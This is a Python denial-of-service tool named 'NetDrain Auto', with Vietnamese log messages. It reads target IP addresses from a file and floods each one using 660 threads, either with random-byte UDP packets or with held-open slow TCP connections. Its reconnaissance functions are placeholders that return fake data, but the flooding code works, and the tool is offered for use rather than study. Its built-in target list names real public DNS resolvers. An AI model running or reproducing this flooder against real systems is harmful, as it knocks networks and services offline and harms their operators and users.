import socket
import threading
import random
import time
import sys
from datetime import datetime

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def get_target_info(ip):
    log(f"[i] Fetching data for {ip}...")
    return {"os": "unknown", "isp": "fake-isp", "location": "unknown"}

def scan_ports(ip):
    log(f"[i] Scanning open ports on {ip}...")
    return [22, 80, 443]

def resolve_dns(domain):
    log(f"[i] Resolving DNS for {domain}...")
    return "127.0.0.1"

def detect_os(ip):
    log(f"[i] Attempting OS detection on {ip}...")
    return "Linux"

def geoip_lookup(ip):
    log(f"[i] Getting geoIP info for {ip}...")
    return {"country": "Unknown", "city": "Nowhere"}

def load_ip_list_from_file(path="targets.txt"):
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        log(f"[!] File '{path}' not found.")
        return []

target_database = {
    "1.1.1.1": {"status": "online", "rating": "high-value"},
    "8.8.8.8": {"status": "protected", "rating": "dangerous"}
}

def udp_drain(ip, port, packet_size):
    data = random._urandom(packet_size)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(data, (ip, port))
        except:
            pass

def tcp_slow(ip, port, delay):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.settimeout(10)
        log(f"[*] Holding TCP connection to {ip}:{port}")
        while True:
            s.send(b"X-a: keep-alive\r\n")
            time.sleep(delay)
    except Exception as e:
        log(f"[!] TCP error: {e}")

def start_attack(ip, port, method, duration, rq):
    end_time = time.time() + duration
    log(f"[~] Starting attack on {ip}:{port} | Method: {method.upper()} | Threads: {rq} | Duration: {duration}s")
    for i in range(rq):
        if method.lower() == "udp":
            t = threading.Thread(target=udp_drain, args=(ip, port, 1400), daemon=True)
        elif method.lower() == "tcp":
            t = threading.Thread(target=tcp_slow, args=(ip, port, 0.5), daemon=True)
        else:
            log(f"[!] Unknown method '{method}'. Exiting.")
            sys.exit(1)
        t.start()
        time.sleep(0.005)

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        log(f"[~] Attack in progress... {remaining} seconds remaining.")
        time.sleep(5)
    log("[✓] Attack time is over.")

def auto_mode():
    print(r"""
   ____             _       _         _          
  |  _ \  __ _ _ __(_) __ _| |__  ___| |_ _   _  
  | | | |/ _` | '__| |/ _` | '_ \/ __| __| | | | 
  | |_| | (_| | |  | | (_| | | | \__ \ |_| |_| | 
  |____/ \__,_|_|  |_|\__, |_| |_|___/\__|\__, | 
                      |___/              |___/  
        NetDrain Auto v2.0 by Ngzz Dat
    """)
    
    # Tải danh sách IP từ file
    ip_list = load_ip_list_from_file("targets.txt")
    if not ip_list:
        log("[!] Không có IP để tấn công. Kiểm tra lại targets.txt")
        sys.exit(1)

    default_port = 10018
    default_method = "udp"
    default_duration = 200
    default_threads = 660

    for ip in ip_list:
        log(f"[*] Đang kiểm tra mục tiêu {ip}")
        get_target_info(ip)
        scan_ports(ip)
        resolve_dns(ip)
        detect_os(ip)
        geoip_lookup(ip)

        if ip in target_database:
            info = target_database[ip]
            log(f"[i] Được tìm thấy trong database - Trạng thái: {info['status']}, Độ ưu tiên: {info['rating']}")

        start_attack(ip, default_port, default_method, default_duration, default_threads)
        log(f"[✓] Hoàn tất với {ip}. Nghỉ trước khi tiếp tục...\n")
        time.sleep(5)

    log("[✔️] Tất cả mục tiêu đã xử lý thành công.")

if __name__ == "__main__":
    auto_mode()
